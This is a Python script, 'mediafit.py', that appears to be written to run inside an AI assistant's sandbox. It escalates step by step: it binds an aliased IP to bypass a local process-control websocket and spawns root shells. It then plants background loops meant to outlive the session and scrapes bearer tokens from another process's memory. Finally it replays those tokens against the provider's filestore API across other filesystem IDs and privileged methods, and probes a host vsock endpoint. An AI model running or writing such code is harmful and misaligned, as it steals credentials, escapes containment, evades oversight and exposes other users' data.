#!/usr/bin/env python3
# mediafit.py v8.0 -- args-as-argv FIX + TOKEN EXPLOITATION + METHOD DUMP
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

VER, NONCE = "8.0", "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
WSID = "wrkspc_017QU2cVGQTZXEQ6jauRtpN6"
BIN  = "/opt/rclone/rclone-filestore"
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=15):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

def ws_hs(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception: return None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=3.0, quiet=False):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        t = d.decode(errors="replace")
        if not quiet:
            w("        << %s(%d) %s" % ("BIN" if op == 2 else "TEXT", len(d), t[:700].replace("\n"," | ")))
        out.append(t)
    return out

def ws_try(src, msg, label, dur=3.0, quiet=False):
    s = ws_hs(src)
    if not s: w("  [%s] hs fail" % label); return None
    try:
        ws_send(s, json.dumps(msg)); return ws_read(s, dur, quiet)
    finally:
        try: s.close()
        except Exception: pass

def conn(pid, argv, mem=268435456, extra=None):
    cr = {"args": argv, "env_vars": {}, "timeout": 30, "clear_env": False,
          "uid": 0, "gid": 0, "allow_process_id_reuse": True, "reattachable": True,
          "name": pid}
    if mem is not None: cr["memory_limit_bytes"] = mem
    if extra: cr.update(extra)
    return {"process_id": pid, "create_req": cr}

SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
                          socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

def main():
    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE,
      time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
    sec("0. FACTS")
    w("kernel: " + sh("uname -a").strip())
    for f in ("/tmp/mf_api_persist.log", "/tmp/mf_nohup_persist.log"):
        w("  persist %s: %s" % (f, sh("wc -l %s 2>/dev/null; tail -1 %s 2>/dev/null" % (f, f)).replace("\n"," | ") or "(absent)"))
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    if not ws_hs(ALIAS): w("  BYPASS FAILED"); flush(); return
    w("  bypass OK")

    sec("A. *** args AS FULL ARGV ***")
    trials = [
        ("full-argv",   conn("mf_a1", ["/bin/sh", "-c", "echo ARGV_OK; id; pwd; uname -r"])),
        ("env-full",    conn("mf_a2", ["/usr/bin/env"])),
        ("ls-root",     conn("mf_a3", ["/bin/ls", "-la", "/"])),
        ("sh-only",     conn("mf_a4", ["/bin/sh", "-c", "echo ONLY_OK"])),
        ("name-test",   conn("mf_a5", ["/bin/sh", "-c", "echo NAME_OK"], extra={"name": "probe"})),
    ]
    for label, sp in trials:
        r = ws_try(ALIAS, sp, label, 3.5, quiet=True)
        j = " ".join(r or [])
        ok = "FailedToStart" not in j and ("ProcessCreated" in j or "_OK" in j)
        w("  %-12s %s" % (label, "*** WORKING ***" if ok else j[:110]))
        if ok: w("      full: " + j[:400])
    w("  -- if all ENOENT: expanded program/cwd field oracle --")
    MORE = ["exe","bin","file","proc","process","image","run","script","argv0","application",
            "tool","interpreter","cmd_path","program_path","working_directory","directory",
            "current_dir","pwd","chdir","home","exec_path","command_line","task","job","launch",
            "shell_path","bin_path","cwd_path","entry","start","spawn","executable_path"]
    FOUND = {}
    for passval, tag in ((12345, "int"), (True, "bool")):
        remaining = list(MORE)
        for it in range(20):
            sp = conn("mf_o", ["/bin/sh"], extra={c: passval for c in remaining})
            payload = json.dumps(sp)
            r = ws_try(ALIAS, sp, "o", 2.2, quiet=True)
            j = " ".join(r or [])
            if "invalid type" not in j: break
            col = re.search(r"column (\d+)", j); exp = re.search(r"expected ([a-zA-Z0-9_ ]+)", j)
            seg = payload[:int(col.group(1))-1]
            ms = re.findall(r'"([A-Za-z_0-9]+)"\s*:', seg)
            f = ms[-1] if ms else None
            if not f: break
            FOUND[f] = exp.group(1) if exp else "?"
            w("    EXTRA REAL FIELD %-22s expects %s" % (f, FOUND[f]))
            if f in remaining: remaining.remove(f)
    if not FOUND: w("    (no extra fields -> args[0] IS the program, confirmed)")

    sec("B. PID1 ENV via child (clear_env=false)")
    ws_try(ALIAS, conn("mf_env", ["/bin/sh", "-c", "echo ===ENV===; env | sort; echo ===END==="]), "env", 6.0)
    w("  -- clear_env=true + injected env_vars --")
    ws_try(ALIAS, conn("mf_clr", ["/bin/sh", "-c", "env | sort; id"], extra={"clear_env": True, "env_vars": {"MF":"1"}}), "clr", 4.0)
    w("  -- uid/gid 1000 --")
    ws_try(ALIAS, conn("mf_uid", ["/usr/bin/id"], extra={"uid": 1000, "gid": 1000}), "uid", 3.0)

    sec("C. DETACH + REATTACH + SendSignal")
    s = ws_hs(ALIAS)
    if s:
        ws_send(s, conn("mf_sleep", ["/bin/sh", "-c", "echo ALIVE; sleep 60"], 268435456, {"timeout": 120}))
        ws_read(s, 3.0, quiet=True)
        ws_send(s, '{"Detach":null}'); time.sleep(0.8); s.close()
        w("  detached; reattach:")
        ws_try(ALIAS, {"process_id": "mf_sleep"}, "reattach", 3.5)
        w("  SendSignal 15 then reattach:")
        s2 = ws_hs(ALIAS)
        if s2:
            ws_send(s2, '{"SendSignal":15}'); ws_read(s2, 2.0, quiet=True); s2.close()
            ws_try(ALIAS, {"process_id": "mf_sleep"}, "after-sig", 3.0)

    sec("D. PERSISTENCE (API vs nohup)")
    sh("rm -f /tmp/mf_api_persist.log /tmp/mf_nohup_persist.log")
    loop = "while true; do date +%%s >> %s; sleep 2; done"
    ws_try(ALIAS, conn("mf_persist", ["/bin/sh", "-c", loop % "/tmp/mf_api_persist.log"],
                       268435456, {"timeout": None}), "p", 3.0)
    sh("nohup sh -c '%s' >/dev/null 2>&1 &" % (loop % "/tmp/mf_nohup_persist.log"))
    time.sleep(5)
    w("  api lines:   " + sh("wc -l /tmp/mf_api_persist.log 2>/dev/null").strip())
    w("  nohup lines: " + sh("wc -l /tmp/mf_nohup_persist.log 2>/dev/null").strip())

    sec("E. ALL RPC METHODS FROM THE BINARY")
    try: data = open(BIN, "rb").read()
    except Exception: data = b""
    if data:
        for pat in (rb"anthropic\.filestore\.v1alpha\.[A-Za-z]+/[A-Za-z]+",
                    rb'"([A-Z][a-zA-Z]+(File|Directory|Filesystem|Entries|Metadata|Url|Roots|Xattrs|Quota|Changes))"'):
            hits = sorted(set(x.decode(errors="replace") for x in re.findall(pat, data)))
            w("  %s -> %s" % (pat[:34].decode(errors="replace"), " | ".join(h[:60] for h in hits[:40])))
        names = sorted(set(x.decode() for x in re.findall(rb"[A-Z][a-z]+[A-Z][A-Za-z]{3,26}", data)))
        w("  camelCase candidates (%d): %s" % (len(names), ", ".join(names[:80])))

    sec("F. TOKENS -- exploit all four roots")
    cands = []
    try:
        fh = open("/proc/57/mem", "rb", buffering=0); total, buf = 0, b""
        for ln in open("/proc/57/maps").read().splitlines():
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m: continue
            a, b = int(m.group(1), 16), int(m.group(2), 16)
            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
    except Exception as e: buf = b""; w("  mem err " + repr(e))
    for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,200}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,200}", buf):
        cands.append(mm.group(0).decode())
    def b64d(x):
        x += "=" * (-len(x) % 4); return base64.urlsafe_b64decode(x)
    import urllib.request as ur
    def call(path, tok, fsid=None, method="listDirectory", body_extra=None):
        body = {"path": path}
        if fsid: body["filesystem_id"] = fsid
        if body_extra: body.update(body_extra)
        try:
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method,
                            data=json.dumps(body).encode(),
                            headers={"Content-Type": "application/json",
                                     "Connect-Protocol-Version": "1",
                                     "Authorization": "Bearer " + tok})
            with ur.urlopen(rq, timeout=9) as r: return r.status, r.read().decode(errors="replace")
        except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
        except Exception as e: return "ERR", repr(e)
    TOKS = {}
    for t in cands:
        p = t.split(".")
        if len(p) != 3 or len(p[2]) < 86: continue
        try: pl = json.loads(b64d(p[1]))
        except Exception: continue
        root = (pl.get("allowed_roots") or ["/"])[0]
        if root in TOKS: continue
        for siglen in (86, 87, 88):
            tok = ".".join([p[0], p[1], p[2][:siglen]])
            c, b = call(root, tok, FSID)
            if c == 200:
                TOKS[root] = tok
                w("  TOKEN OK root=%-14s readonly=%s" % (root, pl.get("readonly"))); break
    for root, tok in TOKS.items():
        c, b = call(root, tok, FSID, "listDirectory", {"recursive": True})
        w("  --- %s recursive listDirectory -> %s" % (root, c))
        w("      " + b[:700])
        if c == 200 and b.strip() not in ("{}", ""):
            try:
                ent = json.loads(b).get("entries") or []
                for e in ent[:3]:
                    fn = e.get("path") or e.get("name")
                    if fn and not fn.endswith("/"):
                        c2, b2 = call(fn, tok, FSID, "readFile")
                        w("      readFile %s -> %s %s" % (fn[:40], c2, b2[:120]))
            except Exception: pass
        for alt in (WSID, "claude_chat_000000000000000000000000"):
            c3, b3 = call(root, tok, alt)
            w("      alt fsid=%-38s -> %-5s %s" % (str(alt)[:36], c3, b3[:90]))
        for m in ("statFile","getFileUrl","listFilesystems","reassignFilesystem","createFile"):
            c4, b4 = call(root, tok, FSID, m)
            w("      %-20s -> %-5s %s" % (m, c4, b4[:110]))
    w("  -- REST family paths with our token --")
    for path in ("/v1/filestore/getFileUrl", "/v1/filestore/statFile",
                 "/v1/filestore/listFilesystems", "/v1/filestore/reassignFilesystem",
                 "/v1/internal/anthropic.filestore.v1alpha.Filesystem/listDirectory"):
        if not TOKS: break
        tok = list(TOKS.values())[0]
        for hn, hv in (("Authorization", "Bearer " + tok), ("x-api-key", tok)):
            try:
                rq = ur.Request("https://api.anthropic.com" + path,
                                data=json.dumps({"path": "/", "filesystem_id": FSID}).encode(),
                                headers={"Content-Type": "application/json", hn: hv})
                with ur.urlopen(rq, timeout=8) as r: cc, bb = r.status, r.read().decode(errors="replace")
            except ur.HTTPError as e: cc, bb = e.code, e.read().decode(errors="replace")
            except Exception as e: cc, bb = "ERR", repr(e)
            w("    %-58s %-12s -> %-5s %s" % (path, hn, cc, bb[:90]))

    sec("G. HOST OTLP 422 investigation")
    AFV = getattr(socket, "AF_VSOCK", 40)
    for label, body, ct in (("rm_empty", b"\x0a\x00", "application/x-protobuf"),
                            ("rm_scope", b"\x0a\x02\x12\x00", "application/x-protobuf"),
                            ("scope_only", b"\x12\x00", "application/x-protobuf"),
                            ("garbage", b"\xff\xff", "application/x-protobuf"),
                            ("json_otlp", b'{"resourceMetrics":[]}', "application/json")):
        try:
            s = socket.socket(AFV, socket.SOCK_STREAM); s.settimeout(7.0)
            s.connect((2, 5005))
            hdr = ("POST /v1/metrics HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n"
                   "Content-Type: %s\r\nContent-Length: %d\r\n\r\n" % (ct, len(body)))
            s.sendall(hdr.encode()+body)
            d = b""
            try:
                while len(d) < 2048:
                    c = s.recv(1024)
                    if not c: break
                    d += c
            except socket.timeout: pass
            s.close(); w("  %-12s -> %s" % (label, d[:140].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
        except Exception as e: w("  %-12s ERR %r" % (label, e))
        time.sleep(0.3)

    sec("VERDICT"); w("  tokens=%d  spawn=%s" % (len(TOKS), "see A")); flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + " nonce=" + NONCE)